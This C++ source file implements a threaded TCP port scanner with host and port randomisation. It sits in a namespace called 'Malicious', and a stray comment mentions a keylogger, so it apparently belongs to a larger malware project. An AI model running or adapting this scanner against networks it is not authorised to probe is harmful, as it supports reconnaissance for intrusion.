#include "NetScan.hpp"

#include <common/RandomHat.hpp>
#include <network/TcpClient.hpp>
#include <log/Log.hpp>

namespace Malicious {
	NetScan::NetScan(const HostList& hostsArg, const PortList& portsArg, bool randomizeArg, Network::Timeout delayArg) :
		Thread((LPTHREAD_START_ROUTINE)ScanLoop, this),
		hosts(hostsArg),
		ports(portsArg),
		randomize(randomizeArg),
		delay(delayArg) {
	}

	void NetScan::start() {
		//TRACE_FUNCTION
		// on ne démarre le keylogger uniquement s'il n'est pas déjà actif
		Thread::start();
		LOG << "Net scan started";
	}

	void NetScan::stop() {
		TRACE_FUNCTION
		if(isRunning()) {
			Thread::stop();
			LOG << "Net scan stopped";
		}
	}

	bool NetScan::scan(const Network::Host& host, const Network::Port& port) {
		static Network::TcpClient client;
		bool result = client.connect(host, port/*, delay*/);
		client.close();
		return result;
	}

	DWORD WINAPI NetScan::ScanLoop(LPVOID parameter) {
		NetScan * ns = (NetScan*)parameter;

		Common::Hat<Network::Host> hostHat;
		hostHat.assign(ns->hosts.begin(), ns->hosts.end());
		Common::Hat<Network::Port> portHat;
		portHat.assign(ns->ports.begin(), ns->ports.end());
		if(ns->randomize) {
			hostHat.mix();
			portHat.mix();
		}

		for(HostList::iterator hostIter = hostHat.begin(); hostIter != hostHat.end(); hostIter++) {
			for(PortList::iterator portIter = portHat.begin(); portIter != portHat.end(); portIter++) {
				if(ns->isRunning()) {
					bool result = ns->scan(*hostIter, *portIter);
					ns->results[*hostIter][*portIter] = result;
					LOG << "Scanning of host " + *hostIter + " on port " + Common::toString(*portIter) + " : " + Common::toString(result);
				} else {
					break;
				}
			}
		}
		return 0;
	}

} // Malicious
